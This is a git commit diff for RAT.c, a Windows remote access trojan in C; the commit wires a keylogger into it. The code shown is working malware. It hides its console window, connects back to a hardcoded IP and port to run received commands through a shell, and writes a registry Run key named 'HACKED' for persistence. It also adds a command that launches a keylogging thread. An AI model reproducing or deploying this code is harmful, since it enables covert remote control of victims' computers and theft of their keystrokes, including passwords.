d5dc0972286aca19312dff01e85abd4fb16bec82
dr37 <naledi.madlopha@gmail.com>
2024-10-29 18:57:59 +0200

    feat: Implement the Keylogger
    - Implement the keylogger to capture the keyboard input from the
    target machine

--- RAT.c
+++ RAT.c
@@ -9,33 +9,38 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include "keylogger.h"
 
-#define bzero(p, size) (void) memset((p), 0, (size))
+#define bzero(p, size) (void)memset((p), 0, (size))
 
 int sock;
 
-int bootRun() {
+int bootRun()
+{
 	char err[128] = "Failed\n";
 	char suc[128] = "Created persistence at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
 	TCHAR szPath[MAX_PATH];
 	DWORD pathLen = 0;
 
 	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
-	if (pathLen == 0) {
+	if (pathLen == 0)
+	{
 		send(sock, err, sizeof(err), 0);
 		return -1;
 	}
 
 	HKEY NewVal;
 
-	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+	{
 		send(sock, err, sizeof(err), 0);
-                return -1;
+		return -1;
 	}
 
 	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 
-	if (RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+	if (RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
+	{
 		RegCloseKey(NewVal);
 		send(sock, err, sizeof(err), 0);
 		return -1;
@@ -44,68 +49,85 @@ int bootRun() {
 	RegCloseKey(NewVal);
 	send(sock, suc, sizeof(suc), 0);
 	return 0;
-
 }
 
-char * str_cut(char str[], int slice_from, int slice_to) {
-        if (str[0] == '\0')
-                return NULL;
+char *str_cut(char str[], int slice_from, int slice_to)
+{
+	if (str[0] == '\0')
+		return NULL;
 
-        char *buffer;
-        size_t str_len, buffer_len;
+	char *buffer;
+	size_t str_len, buffer_len;
 
-        if (slice_to < 0 && slice_from > slice_to) {
-                str_len = strlen(str);
-                if (abs(slice_to) > str_len - 1)
-                        return NULL;
+	if (slice_to < 0 && slice_from > slice_to)
+	{
+		str_len = strlen(str);
+		if (abs(slice_to) > str_len - 1)
+			return NULL;
 
-                if (abs(slice_from) > str_len)
-                        slice_from = (-1) * str_len;
+		if (abs(slice_from) > str_len)
+			slice_from = (-1) * str_len;
 
-                buffer_len = slice_to - slice_from;
-                str += (str_len + slice_from);
+		buffer_len = slice_to - slice_from;
+		str += (str_len + slice_from);
+	}
+	else if (slice_from >= 0 && slice_to > slice_from)
+	{
+		str_len = strlen(str);
 
-        } else if (slice_from >= 0 && slice_to > slice_from) {
-                str_len = strlen(str);
+		if (slice_from > str_len - 1)
+			return NULL;
+		buffer_len = slice_to - slice_from;
+		str += slice_from;
+	}
+	else
+		return NULL;
 
-                if (slice_from > str_len - 1)
-                        return NULL;
-                buffer_len = slice_to - slice_from;
-                str += slice_from;
-
-        } else
-                return NULL;
-
-        buffer = calloc(buffer_len, sizeof(char));
-        strncpy(buffer, str, buffer_len);
-        return buffer;
+	buffer = calloc(buffer_len, sizeof(char));
+	strncpy(buffer, str, buffer_len);
+	return buffer;
 }
 
-void Shell() {
+void Shell()
+{
 	char buffer[1024];
 	char container[1024];
 	char total_response[18384];
 
-	while (1) {
-		jump:
+	while (1)
+	{
+	jump:
 		bzero(buffer, sizeof(buffer));
 		bzero(container, sizeof(container));
 		bzero(total_response, sizeof(total_response));
 		recv(sock, buffer, 1024, 0);
 
-		if (strncmp("q", buffer, 1) == 0) {
+		if (strncmp("q", buffer, 1) == 0)
+		{
 			closesocket(sock);
 			WSACleanup();
 			exit(0);
-		} else if (strncmp("cd ", buffer, 3) == 0) {
+		}
+		else if (strncmp("cd ", buffer, 3) == 0)
+		{
 			chdir(str_cut(buffer, 3, 100));
-		} else if (strncmp("register", buffer, 8) == 0) { 
+		}
+		else if (strncmp("register", buffer, 8) == 0)
+		{
 			bootRun();
-		} else {
+		}
+		else if (strncmp("keylog_start", buffer, 12) == 0)
+		{
+			HANDLE thread = CreateThread(NULL, 0, logkey, NULL, 0, NULL);
+			goto jump;
+		}
+		else
+		{
 			FILE *fp;
 			fp = _popen(buffer, "r");
-			
-			while (fgets(container, 1024, fp) != NULL) {
+
+			while (fgets(container, 1024, fp) != NULL)
+			{
 				strcat(total_response, container);
 			}
 
@@ -115,8 +137,9 @@ void Shell() {
 	}
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
-	HWND  stealth;
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
+{
+	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
 
@@ -128,9 +151,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	WSADATA wsaData;
 
 	ServIP = "192.168.101.173";
-	ServPort =  50005;
+	ServPort = 50005;
 
-	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
+	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
+	{
 		exit(1);
 	}
 
@@ -141,10 +165,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
 	ServAddr.sin_port = htons(ServPort);
 
-	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
+	while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
+	{
 		Sleep(10);
 	}
 
 	Shell();
-
 }
